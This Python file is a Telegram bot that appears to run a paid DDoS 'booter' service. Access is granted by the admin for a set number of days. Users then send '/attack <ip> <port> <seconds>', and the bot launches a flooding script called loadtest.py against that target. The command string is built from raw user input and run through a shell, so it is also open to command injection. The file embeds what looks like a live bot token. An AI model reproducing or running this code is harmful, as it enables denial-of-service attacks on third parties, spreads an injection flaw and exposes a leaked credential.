import time
import subprocess
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from datetime import datetime, timedelta

BOT_TOKEN = "8058304193:AAHK6jt0s7L2Qg8S_dxdzeuWBhHfyMn5PYc"
ADMIN_ID = 1730899531
user_access = {}

bot = telebot.TeleBot(BOT_TOKEN)

def has_access(user_id):
    if user_id in user_access and user_access[user_id] > datetime.now():
        return True
    return False

@bot.message_handler(commands=['start'])
def start(message):
    if str(message.from_user.id) == str(ADMIN_ID):
        bot.send_message(message.chat.id, f"🛡 Welcome Admin!\nUse /attack <ip> <port> <seconds> to launch.\nUse /admin <activate/deactivate> <user id> <days>")
    else:
        if has_access(message.from_user.id):
            bot.send_message(message.chat.id, f"✅ Access Granted\nUse /attack <ip> <port> <seconds>")
        else:
            bot.send_message(message.chat.id, "🚫 You don't have access. Contact @darkbloodyt999")

@bot.message_handler(commands=['admin'])
def admin(message):
    if str(message.from_user.id) != str(ADMIN_ID):
        return

    try:
        parts = message.text.split()
        action, uid = parts[1], int(parts[2])

        if action == 'activate':
            days = int(parts[3])
            user_access[uid] = datetime.now() + timedelta(days=days)
            bot.send_message(uid, "🎉 Your Plan Is Activated By Vijay")
            bot.send_message(message.chat.id, f"✅ Activated for user {uid} for {days} day(s)")
        elif action == 'deactivate':
            user_access.pop(uid, None)
            bot.send_message(uid, "⚠️ Plan Deactivated by Vijay")
            bot.send_message(message.chat.id, f"❌ Deactivated access for user {uid}")
    except:
        bot.send_message(message.chat.id, "❌ Invalid command format.")

@bot.message_handler(commands=['attack'])
def attack(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID and not has_access(user_id):
        bot.send_message(message.chat.id, "🚫 You don't have access!")
        return

    try:
        _, ip, port, seconds = message.text.split()
        cmd = f"python3 loadtest.py {ip} {port} {seconds}"
        subprocess.Popen(cmd, shell=True)
        bot.send_message(message.chat.id, f"🚀 Attack Started on {ip}:{port} for {seconds}s")
    except:
        bot.send_message(message.chat.id, "❌ Invalid format. Use /attack <ip> <port> <seconds>")

bot.polling()